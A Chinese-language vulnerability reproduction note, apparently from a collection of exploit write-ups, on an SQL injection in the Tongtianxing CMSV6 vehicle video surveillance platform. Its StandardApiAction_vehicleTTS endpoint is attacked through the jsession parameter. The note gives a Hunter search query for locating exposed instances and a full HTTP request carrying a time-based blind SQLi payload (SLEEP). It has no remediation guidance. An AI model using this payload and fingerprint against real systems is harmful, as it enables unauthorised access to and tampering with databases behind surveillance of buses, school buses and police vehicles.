# 通天星CMSV6车载视频监控平台 StandardApiAction_vehicleTTS存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台StandardApiAction_vehicleTTS存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/cz217sMk_C1P0rEd/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-644770.png)

# 四、漏洞复现
```plain
GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(3)))DpjE)--%20gtMe HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=8D45F4B70B77ED88CCD43B3050A2934F
Connection: close
```

![1706887910425-9c6df7cf-28b3-403c-a048-e666ce8cf4af.png](./img/cz217sMk_C1P0rEd/1706887910425-9c6df7cf-28b3-403c-a048-e666ce8cf4af-848983.png)

```plain
/StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11
```

![1706888743695-736d4eba-5807-4067-ab5b-db94423a9e94.png](./img/cz217sMk_C1P0rEd/1706888743695-736d4eba-5807-4067-ab5b-db94423a9e94-050317.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dm6snum2k0g80c2g>